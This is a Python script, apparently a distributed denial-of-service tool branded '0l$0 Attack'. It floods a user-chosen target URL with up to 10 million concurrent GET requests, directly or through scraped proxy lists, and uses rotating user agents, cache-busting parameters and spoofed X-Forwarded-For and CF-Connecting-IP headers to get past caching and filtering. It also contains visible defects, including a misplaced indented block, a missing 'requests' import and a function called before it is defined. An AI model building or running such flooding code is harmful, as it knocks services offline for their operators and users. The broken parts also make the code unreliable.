#!/usr/bin/env python3
from os import name
from random import randint, choice, sample
from urllib.parse import urlparse
from aiohttp import ClientSession, TCPConnector
from asyncio import ensure_future, run, Semaphore, wait
if name == 'nt':
    from asyncio import ProactorEventLoop
else:
    from asyncio import get_event_loop
from aiosocks.connector import ProxyConnector, ProxyClientRequest
from aiosocks import SocksError


class Options:
    url = ""
    host = ""
    vector = ""
    v_type = ""
    threads = 0
    ua = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
    ]
    yokais = []
    reset = '\033[0m'
    green = '\033[32;1m'
    blue = '\033[34;1m'
    red = '\033[31;1m'
    cyan = '\033[36;1m'
    banner = '''
                                       ,----------------,               ,---------,
                                  ,-----------------------,           ,'        ,'|
                                ,'                       ,'|        ,'        ,'  |
                                +-----------------------+  |      ,'        ,'    |
                                |  .-----------------.  |  |     +---------+      |
                                |  |                 |  |  |     | -==----'|      |
                                |  |  > \033[31;1m0l$0 Attack♥\033[0m |  |  |     |         |      |
                                |  |  > cd \033[34;1mX\033[0m:        |  |  |/----|`---=    |      |
                                |  |  \033[34;1mX\033[0m:\> \033[31;1m0L$0.PY\033[0m   |  |  |   ,/|==== ooo |      ;
                                |  |                 |  |  |  // |(((( [33]|    ,'
                                |  `-----------------'  |,' .;'| |((((     |  ,'
                                +-----------------------+  ;;  | |         |,'
                                  /_)______________(_/  //'    | +---------+
                             ___________________________/___   `,
                            /  oooooooooooooooo  .o.  oooo /,   \,'-----------,
                           / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,'
                          /_==__==========__==_ooo__ooo=_/'   /___________,'

                                        \033[32;1mCoded by\033[0m \033[36;1m@d3vbl4ck\033[0m
            '''

YU = str(input("Update yokais.txt? [y/n]"))
    if YU == "n" or YU =="N":
        pass
    else:
        yokaisUpdate()

class Functions:
    @staticmethod
    def Error(string, tp=0):
        if tp == 1:
            exit("\n{}[X] {}{}".format(Options.red, string, Options.reset))
        else:
            print("{}[X] {}{}".format(Options.red, string, Options.reset))

    @staticmethod
    def Success(string):
        print("{}[/] {} [/]{}".format(Options.green, string, Options.reset))

    @staticmethod
    def CheckURL():
        try:
            p = urlparse(Options.url)
            Options.host = p.netloc
            return all([p.scheme, p.netloc, p.path])
        except:
            return False

    @staticmethod
    def TypeExits():
        if Options.v_type in ["direct", "http", "socks4", "socks5"]:
            return True
        else:
            return False

    @staticmethod
    def YokaiMode():
        if Options.v_type in ["http", "socks4", "socks5"]:
            return True
        else:
            return False

    @staticmethod
    def FakeIP():
        return "{}.{}.{}.{}:8080".format(*sample(range(0, 255), 4))

    @staticmethod
    def Cache():
        #rand param
        return "?t={}".format(randint(666, 96969))

def yokaisUpdate():
    f = open("yokais.txt", 'wb')
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true")
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxyscan.io/download?type=socks5")
        f.write(r.content)
        f.close()
    except:
        f.close()
    print("yokais.txt update successful!")

class Form:
    @staticmethod
    def Target():
        while True:
            try:
                Options.url = input("> Target: ").lower()
                if Functions.CheckURL() == False:
                    Functions.Error("Please enter a valid URL/HOST.")
                else:
                    break
            except (KeyboardInterrupt, EOFError):
                Functions.Error("Bye bye.", 1)

    @staticmethod
    def Vector():
        while True:
            try:
                print('[?]\n  [-] => GET\n[?]')
                Options.vector = input("> Vector: ").lower()
                if Options.vector != "get":
                    Functions.Error("Please enter a valid Vector.")
                else:
                    break
            except (KeyboardInterrupt, EOFError):
                Functions.Error("Bye bye.", 1)

    @staticmethod
    def Type():
        while True:
            try:
                print('[?]\n  [-] => Direct\n  [-] => HTTP\n  [-] => SOCKS4\n  [-] => SOCKS5\n[?]')
                Options.v_type = input("> Vector Type: ").lower()
                if Functions.TypeExits() == False:
                    Functions.Error("Please enter a valid Vector Type.")
                else:
                    if Functions.YokaiMode() == True:
                        f = open(input("> List[yokais.txt]: "))
                        #remove repetitive ips list(dict.fromkeys(var))
                        Options.yokais = f.read().splitlines()
                        f.close()
                    break
            except IOError:
                Functions.Error("Error, try another list.")
            except (KeyboardInterrupt, EOFError):
                Functions.Error("Bye bye.", 1)

    @staticmethod
    def Threads():
        while True:
            try:
                Options.threads = int(input("> Threads[1000]: "))
                if Options.threads < 0:
                    Options.threads = 1000
                else:
                    break
            except ValueError:
                Functions.Error("Please enter a valid number.")
            except (KeyboardInterrupt, EOFError):
                Functions.Error("Bye bye.", 1)

    @staticmethod
    def Validate():
        Form.Target()
        Form.Vector()
        Form.Type()
        Form.Threads()


async def Yokai(session):
    url = Options.url
    header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;',
        'Cache-Control': 'public, max-age=0',
        'Content-Encoding': 'deflate',
        'Connection': 'keep-alive',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Real-Ip': '127.0.0.1',
        'CF-Connecting-IP': '127.0.0.1',
        'True-Client-IP': '127.0.0.1',
        'Via': '1.1 Chrome-Compression-Proxy',
        'Host': Options.host
    }
    tasks = []
    sem = Semaphore(Options.threads)

    async def _call(i):
        try:
            kai = choice(Options.yokais)
            header.update({
                "User-Agent": choice(Options.ua)
            })
            server = "{}://{}".format(Options.v_type, kai)
            async with session.get(url=url + Functions.Cache(), allow_redirects=True, ssl=True, proxy=server, headers=header) as response:
                sem.release()
                if i % 1000 == 0:
                    Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
        except:
            pass

    for i in range(1, 10000000):
        await sem.acquire()
        task = ensure_future(_call(i))
        task.add_done_callback(tasks.remove)
        tasks.append(task)

    await wait(tasks)
    Functions.Success("Attack complete 10m of requests")

async def Direct(session):
    url = Options.url
    header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;',
        'Cache-Control': 'public, max-age=0',
        'Content-Encoding': 'deflate',
        'Connection': 'keep-alive',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Real-Ip': '127.0.0.1',
        'CF-Connecting-IP': '127.0.0.1',
        'True-Client-IP': '127.0.0.1',
        'Via': '1.1 Chrome-Compression-Proxy',
        'Host': Options.host
    }
    tasks = []
    sem = Semaphore(Options.threads)

    async def _call(i):
        try:
            header.update({
                "User-Agent": choice(Options.ua)
            })
            async with session.get(url=url + Functions.Cache(), allow_redirects=False, ssl=False, headers=header) as response:
                sem.release()
                if i % 1000 == 0:
                    Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
        except:
            pass

    for i in range(1, 10000000):
        await sem.acquire()
        task = ensure_future(_call(i))
        task.add_done_callback(tasks.remove)
        tasks.append(task)

    await wait(tasks)
    Functions.Success("Attack complete 10m of requests")


async def Attack():
    if Functions.YokaiMode() == True:
        async with ClientSession(connector=ProxyConnector(remote_resolve=True,limit=None), request_class=ProxyClientRequest) as session:
            await ensure_future(Yokai(session))
    else:
        async with ClientSession(connector=TCPConnector(limit=None)) as session:
            await ensure_future(Direct(session))


def Console():
    try:
        print(Options.banner)
        input("\n\tI'm not responsible for any consequence of the use of this tool, press ENTER to continue.")
        Form.Validate()
        if name == 'nt':
            loop = ProactorEventLoop()
        else:
            loop = get_event_loop()
        loop.run_until_complete(Attack())
        loop.close()
    except (KeyboardInterrupt, EOFError):
        Functions.Error("Bye bye.", 1)


if __name__ in '__main__':
    Console()
